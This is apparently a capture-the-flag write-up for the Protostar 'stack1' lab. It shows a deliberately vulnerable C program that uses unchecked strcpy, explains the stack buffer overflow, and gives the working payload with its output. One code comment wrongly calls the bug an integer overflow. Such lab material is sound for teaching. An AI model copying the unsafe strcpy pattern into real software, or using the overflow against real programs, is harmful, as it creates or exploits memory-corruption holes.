# STACK 1

## SOURCE CODE

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) 
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]); 					// vuln is here (integer overflow)

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

## IDEA

- We will write 64 bytes to fill up the buffer content, and then overwrite into content of "modified" variable, this content will hold 0x61626364 to run into true branch of if.

## DETAIL

- This program will take input like this

```
			argv[0]     argv[1] 	.... 
			   | 	       |
			   v 	       v
			./program  input[1]     ....
```

- This program will take argv[1] as input


- I will overwrite all 64 bytes of "buffer" variable and modified the modified variable (modifiable because it initializes with volatile keyword). Because protostar using little edian to store data, so the number 0x61626364 will be "\x64\x63\x62\x61", it's the same as "dcba"

- I will generate 64 bytes with python ("a"*64)

## EXPLOIT

- Payload:

```
./stack1 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadcba
```

## Result

```
$ ./stack1 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadcba
you have correctly got the variable to the right value
```
